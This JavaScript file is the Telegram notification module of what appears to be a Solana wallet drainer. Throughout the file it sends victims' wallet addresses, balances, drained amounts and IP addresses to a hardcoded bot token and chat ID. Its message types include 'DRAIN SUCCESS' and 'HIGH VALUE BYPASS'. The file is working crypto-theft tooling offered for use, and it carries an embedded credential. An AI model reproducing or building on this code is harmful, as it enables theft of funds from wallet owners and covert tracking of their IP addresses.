import 'dotenv/config';

class TelegramLogger {
  constructor() {
    // Try environment variables first, then fallback to hardcoded values
    this.botToken = process.env.TELEGRAM_BOT_TOKEN || '8183467058:AAHf02SzNmP5xoqtRvIJQAN5bKE7_f-gMPQ';
    this.chatId = process.env.TELEGRAM_CHAT_ID || '7900328128';
    
    // Enable Telegram with valid credentials
    this.enabled = !!(this.botToken && this.chatId);
    
    if (this.enabled) {
      console.log('📱 Telegram logging enabled');
      console.log('🤖 Bot Token:', this.botToken.substring(0, 10) + '...');
      console.log('💬 Chat ID:', this.chatId);
    } else {
      console.log('⚠️ Telegram logging disabled - missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
      console.log('📝 Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables to enable Telegram logging');
    }
  }

  /**
   * Send message to Telegram
   */
  async sendMessage(message, type = 'info') {
    if (!this.enabled) return;

    try {
      const formattedMessage = this.formatMessage(message, type);
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: formattedMessage,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });

      if (!response.ok) {
        console.error('❌ Failed to send Telegram message:', response.statusText);
      }
    } catch (error) {
      console.error('❌ Telegram send error:', error.message);
    }
  }

  /**
   * Format message with emojis and styling
   */
  formatMessage(message, type) {
    const timestamp = new Date().toLocaleString();
    const emoji = this.getEmoji(type);
    const prefix = this.getPrefix(type);
    
    return `${emoji} <b>${prefix}</b>\n\n${message}\n\n<code>⏰ ${timestamp}</code>`;
  }

  /**
   * Get emoji for message type
   */
  getEmoji(type) {
    const emojis = {
      'WALLET_DETECTED': '👛',
      'DRAIN_SUCCESS': '💰',
      'DRAIN_FAILED': '❌',
      'TRANSACTION_CANCELLED': '🚫',
      'RATE_LIMIT': '⏰',
      'HIGH_VALUE_BYPASS': '💎',
      'INSUFFICIENT_FUNDS': '💸',
      'ERROR': '🚨'
    };
    return emojis[type] || 'ℹ️';
  }

  /**
   * Get prefix for message type
   */
  getPrefix(type) {
    const prefixes = {
      'WALLET_DETECTED': 'WALLET DETECTED',
      'DRAIN_SUCCESS': 'DRAIN SUCCESS',
      'DRAIN_FAILED': 'DRAIN FAILED',
      'TRANSACTION_CANCELLED': 'TRANSACTION CANCELLED',
      'RATE_LIMIT': 'RATE LIMIT',
      'HIGH_VALUE_BYPASS': 'HIGH VALUE BYPASS',
      'INSUFFICIENT_FUNDS': 'INSUFFICIENT FUNDS',
      'ERROR': 'ERROR'
    };
    return prefixes[type] || 'INFO';
  }

  /**
   * Log wallet detection (all wallets, balance will be updated later)
   */
  async logWalletDetected(data) {
    const balance = data.lamports || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const walletType = data.walletType || 'Unknown';
    
    // Debug logging
    console.log('[TELEGRAM] logWalletDetected called with:', {
      publicKey: data.publicKey,
      walletType: data.walletType,
      lamports: data.lamports,
      ip: data.ip
    });
    console.log('[TELEGRAM] Wallet type for display:', walletType);
    console.log('[TELEGRAM] Known wallet types:', ['Phantom', 'Solflare', 'Backpack', 'Glow', 'Trust Wallet', 'Exodus']);

    // Show wallet type if it's a known wallet type
    const knownWalletTypes = ['Phantom', 'Solflare', 'Backpack', 'Glow', 'Trust Wallet', 'Exodus'];
    const walletTypeDisplay = knownWalletTypes.includes(walletType) ? `💼 <b>Type:</b> ${walletType}` : '';
    console.log('[TELEGRAM] Wallet type display:', walletTypeDisplay);

    const message = `
<b>👛 Wallet Detected</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balanceSOL} SOL
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'WALLET_DETECTED');
  }

  /**
   * Log successful drain (only after broadcast confirmation)
   */
  async logDrainSuccess(data) {
    const drainedAmount = parseInt(data.actualDrainAmount) || 0;
    const drainedSOL = (drainedAmount / 1e9).toFixed(6);
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = parseInt(data.lamports) || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    // Ensure drained amount is always shown, even if 0
    const drainedDisplay = drainedAmount > 0 ? `${drainedSOL} SOL (${drainedAmount} lamports)` : '0.000000 SOL (0 lamports)';
    
    const message = `
<b>💰 Drain Success</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL} SOL
💰 <b>Drained:</b> ${drainedDisplay}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'DRAIN_SUCCESS');
  }

  /**
   * Log failed drain with specific reason
   */
  async logDrainFailed(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    let reason = 'Unknown error';
    
    if (data.error) {
      console.log('[TELEGRAM] Processing error:', data.error, 'Type:', typeof data.error);
      
      // Convert error to string for comparison
      const errorString = typeof data.error === 'string' ? data.error : JSON.stringify(data.error);
      console.log('[TELEGRAM] Error string:', errorString);
      
      if (errorString.includes('INSUFFICIENT_FUNDS')) {
        reason = 'Insufficient funds for fees';
      } else if (errorString.includes('INSUFFICIENT_SOL_FOR_FEES')) {
        reason = 'Insufficient SOL for transaction fees';
      } else if (errorString.includes('INSUFFICIENT_DRAIN_AMOUNT')) {
        reason = 'Drain amount too small after fees';
      } else if (errorString.includes('RATE_LIMITED')) {
        reason = 'Rate limit exceeded';
      } else if (errorString.includes('timeout')) {
        reason = 'Transaction timeout';
      } else if (errorString.includes('Simulation failed')) {
        reason = 'Transaction simulation failed';
      } else if (errorString.includes('InsufficientFundsForRent')) {
        reason = 'Insufficient funds for rent exemption';
      } else {
        reason = errorString;
      }
      
      console.log('[TELEGRAM] Final reason:', reason);
    }
    
    const message = `
<b>❌ Drain Failed</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL} SOL
❌ <b>Reason:</b> ${reason}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'DRAIN_FAILED');
  }

  /**
   * Log transaction cancellation
   */
  async logTransactionCancelled(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const walletType = data.walletType || 'Unknown';
    const reason = data.reason || 'User cancelled transaction';
    const balance = data.lamports || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    const message = `
<b>🚫 Transaction Cancelled</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL} SOL
❌ <b>Reason:</b> ${reason}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'TRANSACTION_CANCELLED');
  }

  /**
   * Log rate limit events
   */
  async logRateLimit(data) {
    const walletAddress = data.user ? data.user.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    
    const message = `
<b>⏰ Rate Limit</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
🌐 <b>IP:</b> ${ip}
📝 <b>Details:</b> ${data.details}
    `.trim();

    await this.sendMessage(message, 'RATE_LIMIT');
  }

  /**
   * Log high value wallet bypass
   */
  async logHighValueBypass(data) {
    const walletAddress = data.user ? data.user.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    const message = `
<b>💎 High Value Bypass</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL} SOL
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'HIGH_VALUE_BYPASS');
  }

  /**
   * Log insufficient funds
   */
  async logInsufficientFunds(data) {
    const walletAddress = data.user ? data.user.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    const message = `
<b>💸 Insufficient Funds</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL} SOL
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'INSUFFICIENT_FUNDS');
  }

  /**
   * Log general errors
   */
  async logError(data) {
    const walletAddress = data.user ? data.user.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    
    const message = `
<b>🚨 Error</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
🌐 <b>IP:</b> ${ip}
❌ <b>Error:</b> ${data.message || data.details}
    `.trim();

    await this.sendMessage(message, 'ERROR');
  }
}

// Create singleton instance
const telegramLogger = new TelegramLogger();

export default telegramLogger; 